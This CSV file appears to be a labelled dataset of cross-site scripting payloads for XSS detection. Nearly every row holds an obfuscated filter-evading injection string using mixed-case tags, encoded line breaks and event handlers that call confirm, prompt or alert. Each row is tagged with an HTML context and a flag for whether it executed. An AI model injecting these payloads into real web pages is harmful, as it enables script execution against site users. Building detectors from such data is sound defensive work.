payload,context,exec,combined
<DETAIls%09onTogGLe+=+[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETAIls%09onTogGLe+=+[8].find(confirm)%0dx//
<a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s
<d3V%0dONpoiNtEREnTer%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0dONpoiNtEREnTer%0a=%0a(prompt)``>v3dm0s
<a%0aonpoInTErEnTeR%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonpoInTErEnTeR%0d=%0dconfirm()%0dx>v3dm0s
<hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>
<A%0doNPointEREnTER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0doNPointEREnTER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//
<D3V/+/ONPoInteRenTer%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/ONPoInteRenTer%0a=%0aconfirm()%0dx>v3dm0s
<D3V%0dONPOiNTeREnteR%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0dONPOiNTeREnteR%0d=%0d(prompt)``%0dx>v3dm0s
<dETAiLs%09ONtogGLE+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAiLs%09ONtogGLE+=+confirm()>
<a%0aOnmOuSEOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnmOuSEOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s
<DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>
<d3V%0aoNMoUsEOver+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3V%0aoNMoUsEOver+=+[8].find(confirm)%0dx>v3dm0s
<deTAILS/+/oNpOInTErENter+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAILS/+/oNpOInTErENter+=+confirm()%0dx>
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_text,0,CTX_html_text CTX_html_text CTX_html_text %3Cscript%3Ealert(1)%3C%2Fscript%3E
<d3v/+/OnpOINTerenTER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/OnpOINTerenTER%0d=%0d(confirm)()>v3dm0s
<A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s
<hTml%0doNMOUseOvEr%09=%09(prompt)``>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml%0doNMOUseOvEr%09=%09(prompt)``>
<D3v%0aonPoiNteREntEr+=+(confirm)()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%0aonPoiNteREntEr+=+(confirm)()>v3dm0s
<a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s
<d3V/+/OnpOInTerENtER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/OnpOInTerENtER%0a=%0a(confirm)()>v3dm0s
<a%0aOnmOuSEOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aOnmOuSEOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s
<DeTAILS%0doNTOGgle%09=%09confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTAILS%0doNTOGgle%09=%09confirm()%0dx>
<a%0dOnPOintEreNtEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnPOintEreNtEr%0a=%0aconfirm()%0dx>v3dm0s
<A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s
<A%09oNpoiNTEReNtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09oNpoiNTEReNtEr%0d=%0d[8].find(confirm)>v3dm0s
<htMl%0dONMoUSEOVer%09=%09confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0dONMoUSEOVer%09=%09confirm()>
<DETaILS/+/oNtoGGle%0a=%0a(prompt)``//,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <DETaILS/+/oNtoGGle%0a=%0a(prompt)``//
<DeTAILs/+/OnPOInTEreNtER%0d=%0d[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAILs/+/OnPOInTEreNtER%0d=%0d[8].find(confirm)>
<hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//
<htMl%0aONPoInTeReNter%0d=%0dconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htMl%0aONPoInTeReNter%0d=%0dconfirm()>
<deTAIls%0aoNpOintErEnteR%09=%09(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAIls%0aoNpOintErEnteR%09=%09(confirm)()//
"<D3v%0donmoUSEOver%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3v%0donmoUSEOver%0d=%0da=prompt,a()>v3dm0s"
<A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s
<a%0aOnmOUseoVEr%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aOnmOUseoVEr%0a=%0a(prompt)``>v3dm0s
"<A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s
<D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s
<HtmL%0aonPOiNterentER%0a=%0a(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL%0aonPOiNterentER%0a=%0a(confirm)()//
"<d3v%0dONpOiNTereNTEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0dONpOiNTereNTEr%0d=%0da=prompt,a()>v3dm0s"
<DEtAILs/+/onTogGLE%0a=%0a(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAILs/+/onTogGLE%0a=%0a(confirm)()%0dx>
<hTMl%09oNmOuseovER%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%09oNmOuseovER%09=%09confirm()//
<d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s
"<htmL%0aoNMoUSeOver%09=%09a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0aoNMoUSeOver%09=%09a=prompt,a()>"
<D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<htMl%0aONPoInTeReNter%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0aONPoInTeReNter%0d=%0dconfirm()>
"<D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s"
<a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s
<HTML%0dOnMoUseOver%09=%09confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML%0dOnMoUseOver%09=%09confirm()//
<a%0dONMOusEovER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dONMOusEovER%09=%09confirm()>v3dm0s
<dEtAILs/+/OnToGgLE+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAILs/+/OnToGgLE+=+confirm()%0dx>
"<A%0donmoUSeOVER%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0donmoUSeOVER%0a=%0aa=prompt,a()>v3dm0s"
<D3V%09oNMOuSEOveR+=+(confirm)()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09oNMOuSEOveR+=+(confirm)()>v3dm0s
<HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//
<dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>
<HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>
<html%0dONPoinTEREnTEr%0d=%0dconfirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html%0dONPoinTEREnTEr%0d=%0dconfirm()//
<a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s
<detAILS%09OntOGGLe%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAILS%09OntOGGLe%0d=%0dconfirm()>
<hTMl/+/ONMOUSEOver+=+(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl/+/ONMOUSEOver+=+(prompt)``//
<D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s
<DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>
<<test>>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <<test>>
"<DeTaIlS%0doNPOIntErentER%09=%09a=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DeTaIlS%0doNPOIntErentER%09=%09a=prompt,a()%0dx>"
<dETAiLS%0aoNtOggLE%0a=%0a[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAiLS%0aoNtOggLE%0a=%0a[8].find(confirm)%0dx//
<d3V/+/ONMOUsEoVer%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/ONMOUsEoVer%09=%09confirm()%0dx>v3dm0s
<d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s
<dETAILs/+/ONpoInTEReNTer+=+confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAILs/+/ONpoInTEReNTer+=+confirm()%0dx//
"<htMl%0aonMOusEOveR+=+a=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0aonMOusEOveR+=+a=prompt,a()%0dx>"
<hTMl%09ONMoUsEOver%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%09ONMoUsEOver%0d=%0dconfirm()%0dx>
<DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>
<details%0aOntoGgLE%09=%09(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <details%0aOntoGgLE%09=%09(confirm)()%0dx//
<audio src=x onerror=alert(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <audio src=x onerror=alert(1)>
<a%0dOnPOintEreNtEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dOnPOintEreNtEr%0a=%0aconfirm()%0dx>v3dm0s
<D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s
<detAIlS%0aoNtOGgLE%09=%09(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAIlS%0aoNtOGgLE%09=%09(prompt)``//
<hTML%09oNMOuSeOVER+=+[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTML%09oNMOuSeOVER+=+[8].find(confirm)%0dx>
<A%09onPOINtEReNter%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09onPOINtEReNter%09=%09confirm()%0dx>v3dm0s
<A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s
<d3v/+/OnpOINTerenTER%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/OnpOINTerenTER%0d=%0d(confirm)()>v3dm0s
<A%09oNPoiNteRenTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09oNPoiNteRenTEr%09=%09confirm()%0dx>v3dm0s
<A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s
<htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//
<HTML%0dOnMoUseOver%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%0dOnMoUseOver%09=%09confirm()//
<d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s
<a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s
<HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//
""" onmouseenter=alert(1) """,html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag "" onmouseenter=alert(1) """
textonly,html_text,0,CTX_html_text CTX_html_text CTX_html_text textonly
<dETAIls%09OnpOiNTEReNtER%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETAIls%09OnpOiNTEReNtER%0d=%0dconfirm()%0dx>
"<d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s"
"<d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s"
"<d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<dEtAiLS%0dOnTOgGLe%0a=%0aa=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dEtAiLS%0dOnTOgGLe%0a=%0aa=prompt,a()%0dx//"
<dETails%0aOnTOgGLe%09=%09[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETails%0aOnTOgGLe%09=%09[8].find(confirm)%0dx>
<deTAiLS/+/ONpOintereNTER+=+[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAiLS/+/ONpOintereNTER+=+[8].find(confirm)%0dx//
<a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s
<dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>
<svg>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <svg>
<A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s
<a%09oNpoINteRenTEr+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%09oNpoINteRenTEr+=+confirm()%0dx>v3dm0s
<dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>
prompt(1),html_text,0,CTX_html_text CTX_html_text CTX_html_text prompt(1)
<HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//
<dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>
"<DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>"
<A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s
<a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s
"<DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>"
<a%0dONMOusEovER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONMOusEovER%09=%09confirm()>v3dm0s
"<DETAiLs%0dONtOGGLE+=+a=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DETAiLs%0dONtOGGLE+=+a=prompt,a()%0dx//"
<a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s
<d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s
<a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s
<A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s
<dEtAiLs%0dONpOinTereNtER%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAiLs%0dONpOinTereNtER%0a=%0aconfirm()//
<d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s
<dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
<D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s
<A%0dONpoInTerEnTer+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dONpoInTerEnTer+=+confirm()>v3dm0s
<a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s
<htML/+/oNpOintErEnter%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML/+/oNpOintErEnter%09=%09confirm()%0dx//
"<d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s
<htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//
<d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s
<A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s
<d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s
<d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s
<hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>
<HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//
"<dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//"
<deTailS%0dONpoINTeReNteR%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTailS%0dONpoINTeReNteR%09=%09confirm()>
<deTAIls%0aONtOggLe%0a=%0a[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAIls%0aONtOggLe%0a=%0a[8].find(confirm)//
<A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s
<Html/+/onPoiNTEReNTEr+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html/+/onPoiNTEReNTEr+=+confirm()//
